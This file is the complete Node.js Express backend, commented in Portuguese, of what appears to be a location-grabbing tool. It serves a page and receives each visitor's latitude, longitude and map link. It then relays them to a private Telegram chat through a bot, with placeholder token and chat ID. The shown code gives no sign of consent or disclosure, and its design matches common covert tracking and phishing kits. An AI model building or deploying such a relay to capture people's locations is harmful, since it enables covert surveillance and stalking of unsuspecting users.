const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const path = require("path"); // Adicionando a importação do 'path'

const app = express();
app.use(cors());
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = "BOT TOKE HERE"; 
const TELEGRAM_CHAT_ID = "CHAT ID HERE"; 

// Serve o arquivo index.html na rota "/"
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html")); // Caminho para o arquivo HTML
});

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    // Envia a localização para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});
